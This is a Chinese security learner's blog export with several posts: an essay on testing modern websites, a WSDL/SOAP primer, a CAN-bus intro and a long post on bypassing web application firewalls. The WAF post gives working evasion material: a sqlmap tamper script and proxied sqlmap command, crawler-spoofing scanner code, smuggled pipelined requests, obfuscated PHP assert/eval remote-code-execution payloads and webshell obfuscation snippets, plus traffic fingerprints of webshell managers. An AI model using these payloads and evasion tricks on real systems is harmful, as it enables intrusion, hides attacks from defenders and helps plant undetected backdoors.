{"meta":{"title":"J3fffff's Blog","subtitle":"","description":"","author":"Jeff","url":"https://j3f5.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2023-05-22T08:59:44.739Z","updated":"2023-05-22T08:59:44.739Z","comments":false,"path":"/404.html","permalink":"https://j3f5.github.io/404.html","excerpt":"","text":""},{"title":"关于","date":"2023-06-05T01:26:18.489Z","updated":"2023-06-05T01:26:18.489Z","comments":false,"path":"about/index.html","permalink":"https://j3f5.github.io/about/index.html","excerpt":"","text":"此文档收录比较有用的资源链接 目前的方向 java审计（先把700集的java基础看完（速通一周），然后再上手其他，注意java-EE的使用） WAF初识 安卓取证与对应攻击 车联网渗透基础 web渗透基础（看小迪和暗月的教程+看国外有什么点可以打，冲，最好挂个代理） 优秀课程 全套渗透 小迪安全 笔记1：https://www.yuque.com/gemaxianrenhm/hahwdw 笔记2：https://www.cnblogs.com/SnowSec/category/1908585.html 笔记3：https://blog.csdn.net/mctsog/category_11584480_2.html 暗月渗透 知识论坛 全面 CN-SEC中文网：https://cn-sec.com/ IOT IOTsec-Zone：https://iotsec-zone.com/ 知识库 大类库 https://github.com/YinWC/Security_Learning"},{"title":"分类","date":"2023-05-22T08:59:44.741Z","updated":"2023-05-22T08:59:44.741Z","comments":false,"path":"categories/index.html","permalink":"https://j3f5.github.io/categories/index.html","excerpt":"","text":""},{"title":"书单","date":"2023-05-22T10:10:32.005Z","updated":"2023-05-22T08:59:44.741Z","comments":false,"path":"books/index.html","permalink":"https://j3f5.github.io/books/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-05-22T08:59:44.742Z","updated":"2023-05-22T08:59:44.742Z","comments":false,"path":"repository/index.html","permalink":"https://j3f5.github.io/repository/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-05-22T08:59:44.742Z","updated":"2023-05-22T08:59:44.742Z","comments":true,"path":"links/index.html","permalink":"https://j3f5.github.io/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-05-22T08:59:44.743Z","updated":"2023-05-22T08:59:44.743Z","comments":false,"path":"tags/index.html","permalink":"https://j3f5.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"权限提升","slug":"权限提升","date":"2023-06-14T02:42:23.000Z","updated":"2023-06-14T02:42:23.000Z","comments":true,"path":"articles/2023/06/14/权限提升/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/","excerpt":"","text":"","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"提权","slug":"提权","permalink":"https://j3f5.github.io/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"渗透测试需要注意的点","slug":"渗透测试需要注意的点","date":"2023-06-14T01:08:03.000Z","updated":"2023-06-14T01:08:03.000Z","comments":true,"path":"articles/2023/06/14/渗透测试需要注意的点/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9/","excerpt":"","text":"前言 首先定义本文所说的现代化网站。 现代化网站是指符合以下多个特征的对外服务。 储存，数据库，网站程序等服务器高度分离 实现现代化前端技术， 如三大框架， html5新api， websocket 基于虚拟化技术的服务部署 使用现代后端框架，如ssm，think5，gin，django 外部服务高度集成 多种客户端，包括Android，Ios，windows 篇幅有限， 不再列举，但相信读者应该能理解笔者的意思。 不属于现代化网站最典型的例子就是 下载cms，安装lnmp，直接安装网站程序。现在渗透教程基本都是基于不属于现代化网站的假设。 参考：https://blue-bird1.github.io/posts/newsitethink/ CDN/反向代理 使用了CDN将会隐藏真实IP， 导致常规端口扫描，弱口令扫描全部失效。 但可以通过寻找真实ip来解决。 反向代理则无解， 甚至可能只把代理服务器暴露于公网。敏感服务全在内网 对绕过CDN这个问题， 已经有了一定的研究。有了安全工具， 如fuckcdn 数据分离 上传文件服务器分离，将导致上传webshell技术失效， 很显然文件服务器是不可能执行webshell的。 上传危害最多只能达到上传html websocket 之所以专门把websocket作为一点， 是因为感觉websocket属于盲区， burp，浏览器均不支持websocket的渗透测试。 新的h5 api html5提供了新的api，但是这方面的安全问题还没有被开发人员重视。这个可以从hackone平台上的漏洞报告看出。例如DOM Based XSS in www。hackerone。com via PostMessage 。 postmessage这类api的输入是不可控的，如果不进行控制， 就是安全问题。 前后端分离 使用三大框架(vue，react， angular)的前端， 对后端进行分离。 也就是不再将url参数直接渲染到html，而通过JavaScript操作。反射xss全部失效，常规储存xss在框架的安全性下也变得渺茫。 JavaScript操作带来的xss反而变为主流。这也对渗透测试人员阅读JavaScript代码带来了挑战 也带来了部分好处，由于在前端操作，后端暴露的接口将会更多。 后端框架 应用了框架后，简单注入全部失效，csrf部分失效， id=x这种低级注入消失。出现注入的点趋向二次注入， 编码注入。 sqlmap是不提供原生支持的。 外部服务接入 对某些功能不自行进行开发，使用其他公司的服务。这部分功能的安全性取决与该公司的安全水平， 不过真挖出漏洞就属于通用0day了。 由于对接入服务的理解，接入处反而容易出现问题， 比如未预料的异常。(接入开发: ???，这个问题你怎么不在服务上处理。服务开发: ???，这个你怎么不在接入处处理) 多服务端 提供了多平台客户端， 这就对渗透测试多平台渗透能力发出了挑战。 不但要会web，还要会安卓/ios渗透测试， 反编译(客户端总是会有一些未公开的api)。甚至还有IOT 风控 好的风控系统 基本阻止了邮箱/短信轰炸。对需要爆破的漏洞也降低了危害。 Xass Sass， Pass，Fass等各种服务公司不断涌现， 可能出现刚拿下shell，想内网渗透，发现实际上服务是在某Sass上。或者发现服务api是在Fass上的，根本没有服务器 虚拟化 docker提供了优秀的服务分离，就算拿到了shell，也只是拿到了容器的shell。 容器虚拟化不一定安全，但是现在对这方面的研究还不是很多， 完全没有对绕过UAC的研究多。 对安全教程的思考 现在一些安全教程还是停留在旧时代， ' and 1=1，&lt;/x&gt;&lt;script&gt;alert(1)&lt;/script&gt;固然是基础，挖掘思路也很重要。 但是随着技术的发展， 渗透和开发技术也会走的更近， 新开发技术的爆发式增长，不可能像列中间件漏洞一样全部写出它们的渗透技术。就算有人写出来，等写出来黄花菜都凉了。 安全教程应该更强调编程， 而不是培养只会用扫描器的驻场工程师。令人欣慰的是现在年轻的渗透测试人员大部分都会编程，还不止一门(就笔者圈子来看)。 对安全工具的思考 扫描器 随着技术的扩散，老式扫描器未来会面临失效。不支持浏览器模拟，只会抓a标签的扫描器， 对前后端分离无能为力。 基于流量和基于爬虫的扫描器会合并， 走向模拟获取流量进行扫描的模式 对app的扫描器目前不支持对web的渗透测试 人工智能 人工智能火热，各路安全公司都号称使用了AI技术(实际上怎么样就不知道了)。 除了使用AI技术对AI进行对抗， AI扫描器也在发展中。 这部分知识，我推荐兜哥的AI安全三部曲。 可以重复的渗透测试动作，AI都可以模拟。随着发展，只会重复的渗透人员会面临淘汰。也能让安全人员拿出精力进行安全研究，而不是重复性的测试。 尾言 现在正是承前启后的时代，旧的开发技术未被淘汰，新的开发技术正在发展， 谁会在这个时代引领潮流， 或是被淘汰。让我们拭目以待吧","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透技巧","slug":"渗透技巧","permalink":"https://j3f5.github.io/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"}]},{"title":"WAF绕过-一般性绕过总结","slug":"WAF绕过-一般性绕过总结","date":"2023-06-12T07:03:07.000Z","updated":"2023-06-12T07:03:07.000Z","comments":true,"path":"articles/2023/06/12/WAF绕过-一般性绕过总结/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/12/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/","excerpt":"","text":"基础绕过 基础绕过一般是针对于payload的绕过，之前迪哥也在各个章节多少有提到过，这里做一些总结。参考文献有： https://blog.gm7.org/个人知识库/01.渗透测试/07.WAF绕过/01.WAF绕过通用思路.html https://www.anquanke.com/post/id/212272#h2-11 双写、大小写 略 编码 这里要说一下： 对于get方法来说，都是把数据串联在请求的url后面作为参数，然后对后面的参数进行URL-ENCODE编码。 URL encode的过程就是把部分url作为字符，按照某种编码方式（如：utf-8，gbk等）编码成二进制的字节码，然后每个字节用一个包含3个字符的字 符串 “%xy” 表示，其中xy为该字节的两位十六进制表示形式。 对于post方法来说，他将使用&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=字符集（GBK，utf-8等）&quot;/&gt;中的charset字段定义编码。有四种方式： 字段 说明 application/x-www-form-urlencoded 在发送前编码所有字符（默认） multipart/form-data 不对字符编码。在使用包含文件上传控件的表单时，必须使用该值。 application/json text/plain 空格转换为 “+” 加号，但不对特殊字符编码。 text/html html编码 所以编码可以分为： URL编码 HTML编码 Base64编码 Unicode编码 十六进制编码 其他后端会解析的编码 注释 垃圾字符 一般waf只会拦截一点点，只要超过这个长度就不检测，所以可以把Payload写在后面 分块传输 严格来说分块传输并不是一种编码解码机制，但是从实际效果来看，大家都把分块传输当成是一种特殊的编码解码办法。里面的很多技巧和编码解码有相似之处。分块传输，又称为Http Chunked。分块传输本身适用于解决大文件传输的问题，属于http标准的协议功能，所有的WEB服务器均支持分块传输。在绕过WAF的测试中，分块传输也是属于编码/解码的一种。只需要设置如下头即可。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。 burp插件：https://github.com/c0ny1/chunked-coding-converter.git 1Transfer-Encoding: chunked HTTP HTTP 0.9 HTTP 0.9协议只有GET方法，且没有HEADER信息等，WAF就可能认不出这种的请求包，于是达到绕过WAF的效果 HTTPS与HTTP http和https同时开放服务，没有做http到https的强制跳转，导致https有waf防护，http没有防护，直接访问http站点绕过防护 参数污染 Web环境 参数获取函数 获取到的参数 PHP/Apache $_GET(“par”) last JSP/Tomcat Request.getParameter(“par”) first Perl(CGI)/Apache Param(“par”) first Python/Apache getvalue(“par”) [“first”,“last”] ASP.NET/IIS Request.QueryString(“par”) first,last Pipeline（keep-alive） http请求头部中有Connection这个字段，建立的tcp连接会根据此字段的值来判断是否断开，当发送的内容太大，超过一个http包容量，需要分多次发送时，值会变成keep-alive，即本次发起的http请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止 我们可以手动将此值置为keep-alive，然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf 记得把brupsuite自动更新Content-Length的勾去掉 参考数据包： 12345678910111213141516171819POST / HTTP/1.1Host: www.baidu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Connection: Keep-AliveContent-Type: application/x-www-form-urlencodedContent-Length: 3a=1GET / HTTP/1.1Host: www.baidu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Connection: close HTTP charset 利用Content-Type: xxx;charset=xxx编码绕过，payload转义后，由于大部分的WAF默认用UTF8编码检测，所以能用此方法来达到绕过关键词过滤的效果。 需要了解上面的编码绕过相关知识，针对的是post。 Waf特性 云waf 写host地址，直达真正的地址，不经过云转发即可！ 白名单绕过 一些WAF为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。 IP白名单 从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。 测试方法：修改http的header来bypasswaf X-forwarded-for X-remote-IP X-originating-IP x-remote-addr X-Real-ip 静态资源 特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测 效率，不去检测这样一些静态文件名后缀的请求。 http://10.9.9.201/sql.php?id=1 http://10.9.9.201/sql.php/1.js?id=1 备注：Aspx/php只识别到前面的.aspx/.php后面基本不识别 url白名单 为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势 Content-Type绕过 一些WAF识别到特定的content-type后，则会判定为该请求的类型，如： 发现Content-Type为multipart/form-data时，会认为这属于文件上传的请求，从而只检测文件上传漏洞，导致不拦截其他类型的payload 请求方式绕过 一些WAF对于get请求和post请求的处理机制不一样，可能对POST请求稍加松懈，因此给GET请求变成POST请求有可能绕过拦截。 一些WAF检测到POST请求后，就不会对GET携带的参数进行过滤检测，因此导致被绕过。 一些WAF检测到HEAD等等请求后，会直接拦截（因为不像是人的操作） 解析兼容性 这个之前说过，举个例子：如果waf是检测filename=&quot;&quot;的最后一个&quot;，那么，只要我们这样构造：filename=&quot;sss&quot;s.php他就不拦截了，会保存为s.php。 容器特性 IIS+ASP %会被自动去掉 unicode会自动解码 Tomcat 路径穿越 1/path1/path2/ == ;/path1;foo/path2;bar/; 信息搜集绕过waf 一般对网站进行扫描的时候，都会产生大量数据包，一些网站对将之识别为CC攻击等等。 如果遇到这种防护，分WAF的类别，例如有阿里云的网站服务器适配、有宝塔等等软件waf等。一般都自己写代码来实现绕过。 那么我们有如下绕过方式 模拟用户请求 即使用常用的UA和常用的请求方式：GET/POST等。 延时 设置延时，每3秒扫一条（阿里云的限制） 模拟爬虫 一般waf为了保证网站被收录，不会拦截爬虫。所以在UA上设置成爬虫即可 1234567891011121314151617181920212223242526百度爬虫，第二条为百度图片爬虫Baiduspider+(+http://www.baidu.com/search/spider.htm&quot;)Baiduspider-imagegoogle爬虫，最后一条为google图片搜索爬虫Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)Googlebot/2.1 (+http://www.googlebot.com/bot.html)Googlebot/2.1 (+http://www.google.com/bot.html)Googlebot-Image/1.0即刻搜索爬虫Mozilla/5.0 (compatible; JikeSpider; +http://shoulu.jike.com/spider.html)雅虎爬虫（分别是雅虎中国和美国总部的爬虫）Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html&quot;)Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp&quot;)新浪爱问爬虫iaskspider/2.0(+http://iask.com/help/help_index.html&quot;)Mozilla/5.0 (compatible; iaskspider/1.0; MSIE 6.0)搜狗爬虫,第三条为搜狗图片爬虫Sogou web spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)Sogou Push Spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)Sogou Pic Spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)搜搜爬虫Sosospider+(+http://help.soso.com/webspider.htm)网易有道爬虫Mozilla/5.0 (compatible; YoudaoBot/1.0; http://www.youdao.com/help/webmaster/spider/; )MSN爬虫msnbot/1.0 (+http://search.msn.com/msnbot.htm) 代理池 因为延时很慢，所以有代理池，使用不同的IP请求，这些IP会转发包回你的IP。免费的代理池很有可能被识别出来，最好用付费的。例如：快代理。当然，也有免费的：proxy pool 代理代码： 1234567891011121314151617181920212223242526272829303132333435363738394041#搜索引擎爬虫模拟及模拟真实用户import requestsimport timeheaders=&#123;&#x27;Connection&#x27;: &#x27;keep-alive&#x27;,&#x27;Cache-Control&#x27;: &#x27;max-age=0&#x27;,&#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;,#模拟用户 Kit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36#模拟引擎 Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)#更多爬虫引擎：https://www.cnblogs.com/iack/p/3557371.html&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (compatible; Baiduspider-render/2.0;+http://www.baidu.com/search/spider.html)&#x27;,&#x27;Sec-Fetch-Dest&#x27;: &#x27;document&#x27;,&#x27;Accept&#x27;:&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;,&#x27;Sec-Fetch-Site&#x27;: &#x27;none&#x27;,&#x27;Sec-Fetch-Mode&#x27;: &#x27;navigate&#x27;,&#x27;Sec-Fetch-User&#x27;: &#x27;?1&#x27;,&#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, br&#x27;,&#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#x27;,&#x27;Cookie&#x27;: &#x27;xxx&#x27;,#根据当前访问 cookie&#125;for paths in open(&#x27;php_b.txt&#x27;,encoding=&#x27;utf-8&#x27;): url=&#x27;http://192.168.0.103:8081/&#x27; paths=paths.replace(&#x27;\\n&#x27;,&#x27;&#x27;) urls=url+paths #如需测试加代理，或加入代理池需加代理 proxy = &#123; &#x27;http&#x27;: &#x27;127.0.0.1:7777&#x27; &#125; try: code=requests.get(urls,headers=headers,verify=False).status_code print(urls+&#x27;|&#x27;+str(code)) if code==200 or code==403: print(urls+&#x27;|&#x27;+str(code)) except Exception as err: print(&#x27;connecting error&#x27;) #time.sleep(3)模拟用户需延时 引擎可用可不用（根据请求速度） 白名单机制（上面有提到） 漏洞发现绕过waf 其实思路和上面一样，多了一些就是对流量特征的更改。现在说一下联动： awvs+burp+xray 漏扫 Payload 绕过-延时，被动 awvs设置 慢扫 UA改为爬虫UA 设置转发 Burp 设置代理转发 XRAY 监听 因为AWVS有慢速扫描还好，如果没有的话，就需要BURP来控制速度（可以安装一个按键精灵，哈哈哈哈），这样才能控制XRAY。 因为每个工具识别漏洞的Payload不一样，所以才可能不会被识别，所以才有联动这一说法。如果存在一款可以自己改Payload特征啥（有HTTP头的更改啥的）的就好了，而且需要控制速度，这通常需要我们自己写。 漏洞利用 这里将不讨论常用的绕过，重点在于工具的绕过以及工具的流量特征。 sql注入（sqlmap特征） 【特征1】攻击产生的流量非常多，一般都会触发cc攻击的防御机制，所以一般会使用--delay或者代理池 【特征2】默认参数，产生的流量如下，其ua头有sqlmap字样，很容易辨认，所以一般会使用参数--random-agent 1234567GET /pikachu/vul/sqli/sqli_str.php?name=admin&amp;submit=查询 HTTP/1.1CACHE-CONTROL: no-cacheCONNECTION: closeUSER-AGENT: sqlmap/1.5.8#stable (http://sqlmap.org)ACCEPT: */*HOST: 192.168.68.78ACCEPT-ENCODING: gzip,deflate 【特征3】 xss测试语句、随机数的位数 【特征4】注入流程/句子比较固定 综合上述，我们可以自己写tamper来替代一些注入句子，更改特征 12345678910111213141516171819#!/usr/bin/env python&quot;&quot;&quot;Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)See the file &#x27;LICENSE&#x27; for copying permission&quot;&quot;&quot;from lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef tamper(payload,**kwargs): retVal =&quot;&quot; if payload: payload = payload.replace(&quot;union&quot;,&quot;%23a%0aunion&quot;) payload = payload.replace(&quot;select&quot;,&quot;/*!4457select*/&quot;) payload = payload.replace(&quot;%20&quot;,&quot;%23a%0a&quot;) payload = payload.replace(&quot; &quot;,&quot;%23a%0a&quot;) payload = payload.replace(&quot;database()&quot;,&quot;database%23a%0a()&quot;) return payload 所以，最终的payload为： 1python sqlmap.py -u &quot;***&quot; --proxy=&quot;http:tps123.kdlapi.com:15818&quot; --tamper=&quot;waf-dog.py&quot; --random-agent 总结一下绕过： 代理：绕过传cc tamper：注入规则 user-agent：修改ua，防止匹配到工具的指纹 XSS（XSStrike绕过） 利用 XSStrike 绕过 加上–timeout 或–proxy 绕过 cc。跑就完事儿了！ 12xsstrike.py -u &quot;目标网址&quot; --timeout x 延时xsstrike.py -u &quot;目标网址&quot; --proxy 代理地址 RCE 可逆算法绕过 base64：很可能base64_decode会被拦截（如果你传入的代码自带base64解码，那当然万事胜意啦，如果没有，那么就只能你传入一个解码函数了）。 1txt=base64_decode(cGhwaW5mbygp) url 编码 进制编码（十六进制）等：很可能会拦截hex等函数，理由跟base64差不多。 1txt=$hex=&#x27;706870696E666F2829&#x27;;assert(pack(&quot;H*&quot;,$hex));submit=%E6%8F%90%E4%BA%A4 替换绕过 也就是将一个字符设置为空，那么这个字符可以加载到任何位置 1txt=$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);assert($y);&amp;submit=%E6%8F%90%E4%BA%A4 拼接 1txt=$X=&#x27;asse&#x27;;$xx=&#x27;rt&#x27;;$xxx=$x.$xx;$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);assert($y);&amp;submit=%E6%8F%90%E4%BA%A4ce 更改传参方式 实际上就是post的data部分传入GET请求，然后再在get请求URL上填入参数 1234[URL GET]http:/127.0.0.1/pikachu/vul/rce/rce_eval.php?x=rt[POST DATA]txt=$x=&#x27;asse&#x27;;$xx=$GET[&#x27;x&#x27;];$xxx=$x.$xx;$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);$xxx($y);&amp;submit=%E6%8F%90%E4%BA%A4 文件包含 ：没什么好说的就这几种 …\\ …/ …\\等 权限控制 一个文件上传到网站之后，杀毒软件会对这个文件进行扫描和监控后续敏感操作。 代码级别的绕过，需要识别各种后门的代码是否是恶意代码 操作级别的绕过，对后门的操作合理化 免杀思路 变量覆盖 例如：&lt;?php assert($_POST['chopper'])?&gt; 变成： 12345&lt;?php$a = $_GET[&#x27;x&#x27;];$$a = $_GET[&#x27;y&#x27;];$b($_POST[&#x27;z&#x27;]);?&gt; 传递的参数为： 1234POST /URL/?x=b&amp;y=assert...[data]z=phpinfo() 注： 简单拆分不行，因为waf会进行变量跟踪 出现关键词不行，会直接拦截 如果传入的phpinfo()等操作被拦截，则需要配合编码 编码 12345&lt;?php$a = $_GET[&#x27;x&#x27;];$$a = $_GET[&#x27;y&#x27;];$b(base64_decode($_POST[&#x27;z&#x27;]));?&gt; 传递的参数为： 1234POST /URL/?x=b&amp;y=assert...[data]z=cGhwaW5mbygp 异或操作&amp;&amp;加密混淆 可以使用工具： 网络接口加密（更稳） enphp工具 造轮子 waf基本都有菜刀、蚁剑、冰蝎的指纹，当你使用他们的时候，一些危害行为会被拦截！ 要想不被识别拦截，只能自己造轮子！ 自己写数据包，不会有那些指纹特征，就能实现功能！ 工具 冰蝎、蚁剑、菜刀、哥斯拉 原理以及优缺点 原理：把一些具体执行语句集成化（各种各样在功能语句都帮你写好了），你直接连接执行就可！ 优缺点：菜刀：未更新状态，无插件，单向加密传输。蚁剑：更新状态，有插件，拓展性强，单向加密传输。冰蝎：更新状态，未知插件，偏向于后渗透（MSF），双向加密传输 单向加密传输是什么？我加密数据给服务器，而服务器返回的就没有加密。 流量分析 菜刀：【z0，明文/base64】 eval函数执行 攻击的payload使用base64编码 默认参数z0 对应$_POST [z0]接收到的数据，该参数值是使用 Base64 编码的，所以可以利用 base64 解码可以看到攻击明文 蚁剑：【ini_set，部分明文】 正文解码发现：@ini_set (&quot;display_errors&quot;,&quot;0&quot;);，也使用base64加密payload 参数名大多以 _0x.....=”这种形式（下划线可替换为其他） 后面为加密数据的数据包也可识别为蚁剑的流量特征 冰蝎：【UA头，content-type，数据长度（协商密钥数据等长），返回的全是加密字符】 冰蝎数据包总是伴随着大量的content-type：application什么什么，无论GET还是POST，请求的http中，content-type为application/octet-stream。还有他们的accept之类的长度总是等长，正常的根据应用场景和不同文件，长度是不同的 内置很多UA头，相同IP重复请求，但是UA头不一样，则需要注意 哥斯拉（base64 加密）：【响应三次】 发送一段固定代码（payload），http 响应为空 发送一段固定代码（test），执行结果为固定内容 发送一段固定代码（getBacisInfo） 混淆免杀工具 上面有提到一些。 注：蚁剑和菜刀的流量后门基本上是一致的，所以都可以用他的混淆，例如D盾的混淆：as-webshell-venom","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"waf绕过","slug":"waf绕过","permalink":"https://j3f5.github.io/tags/waf%E7%BB%95%E8%BF%87/"}]},{"title":"HTTP与开发基础","slug":"HTTP与开发基础","date":"2023-06-12T05:25:20.000Z","updated":"2023-06-12T05:25:20.000Z","comments":true,"path":"articles/2023/06/12/HTTP与开发基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/12/HTTP%E4%B8%8E%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/","excerpt":"","text":"WSDL、SOAP以及WebService 什么是WebService、什么是SOAP以及什么是WSDL 12soap: Simple Object Access Protocol.(简单对象访问协议)wsdl: Web Service Description Language.(Web服务描述语言) 参考：https://zhuanlan.zhihu.com/p/383326629 ，https://blog.csdn.net/dzqxwzoe/article/details/129221428 WebService WebService有着狭义和广义的定义： 广义的来说，WebService就是字面意思：Web+Service，也就是服务(Service)网络(Web)化的意思；它力求的是跨语言和跨平台的、基于Web传输的远程调用能力。 它没有强调远程调用使用什么协议，所以我们可以自由选择，比如SOAP协议或者常见的基于http的json化的数据传输协议。 关于广义的定义更为深入和具体的介绍，可以参看大V阮一峰的这篇博客，就不再过多介绍了，狭义的来说，我们经常谈的WebService是指基于SOAP协议实现的远程服务调用模型； Web service是什么？ - 阮一峰的网络日志www.ruanyifeng.com/blog/2009/08/what_is_web_service.html SOAP SOAP定义了数据交互中如何传递消息的规则； 比如在http中规定了post请求的传参方式，在数据类型不同的情况下可以使用不同的参数方式；其中在form格式下是 key=v&amp;key1=v1，同样SOAP也是定义这些东西的； WSDL 同样的，当我们用http方式去调用一个服务的时候，我们只是知道通用的http协议的传参方式还是不够的，我们仍然需要知道目标服务的接口文档；这就是WSDL，每个服务都有的接口文档。 在http上可能就是我们手写的一个wiki文档，而在SOAP中就是一个用WSDL规范编写的WSDL文档，每个服务是有能力自动生成这个文档的，其中WSDL规范了这个文档该怎么写； 那么我们一般如何阅读WSDL文件呢？——WSDL文档都是从下往上阅读的。先看最底下的service标签，查看其中port标签的binding属性值，然后通过值查找上面的binding标签 定义 123456789101112131415161718192021&lt;definitions&gt; &lt;types&gt; definition of types........ 数据类型定义的容器，它使用某种类型系统(一般地使用XML Schema中的类型系统) &lt;/types&gt; &lt;message&gt; definition of a message.... 通信消息的数据结构的抽象类型化定义。使用Types所定义的类型来定义整个消息的数据结构。 &lt;/message&gt; &lt;portType&gt; definition of a port....... 对于某个访问入口点类型所支持的操作的抽象集合，这些操作可以由一个或多个服务访问点来支持。 &lt;/portType&gt; &lt;binding&gt; definition of a binding.... 特定端口类型的具体协议和数据格式规范的绑定。 &lt;/binding&gt; &lt;service&gt; 相关服务访问点的集合。 &lt;/servie&gt;&lt;/definitions&gt; 举个小李子 综上所述 综上所述 SOAP可以类比http协议：定义了方式 WSDL可以类比一个http服务的接口文档； 在了解了WebService、SOAP以及WSDL相关概念以后, 接着我们的目标便是用ksoap2来发起网络请求获取数据了。 举个小例子： 123456789101112&lt;wsdl:binding name=&quot;WeatherWebServiceSoap&quot; type=&quot;tns:WeatherWebServiceSoap&quot;&gt; &lt;soap:binding transport=&quot;http://schemas.xmlsoap.org/soap/http&quot;/&gt; &lt;wsdl:operation name=&quot;getWeatherbyCityName&quot;&gt; &lt;soap:operation soapAction=&quot;http://WebXml.com.cn/getWeatherbyCityName&quot; style=&quot;document&quot;/&gt; &lt;wsdl:input&gt; &lt;soap:body use=&quot;literal&quot;/&gt; &lt;/wsdl:input&gt; &lt;wsdl:output&gt; &lt;soap:body use=&quot;literal&quot;/&gt; &lt;/wsdl:output&gt; &lt;/wsdl:operation&gt; &lt;/wsdl:binding&gt;","categories":[{"name":"开发基础","slug":"开发基础","permalink":"https://j3f5.github.io/categories/%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/"}],"tags":[]},{"title":"车联网基础-协议","slug":"车联网基础-协议","date":"2023-06-12T02:19:22.000Z","updated":"2023-06-12T02:19:22.000Z","comments":true,"path":"articles/2023/06/12/车联网基础-协议/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/12/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"CAN协议 总线协议通过车辆的网络控制数据包的传输。其中有成百上千的传感器与我们的车辆系统相连接，总线协议的选择至关重要，CAN协议就是其中之一，它常常配合着OBD-II连接器出现。 CAN协议有高速车线和低速车线 高速（CANH）：RPM控制 中低速（CANL）：门把所、空调 这意味着当信号进来时，CAN提高一条线上的电压，并降低另一条线上的电压。这种差分信号用于必须容错噪声的环境中，例如汽车系统和制造业。当一个位在CAN总线上传输时，信号将同时广播高1V和低1V。传感器和ECU有一个收发器，检查以确保两个信号都被触发;如果不是，收发器将数据包作为噪声拒绝。 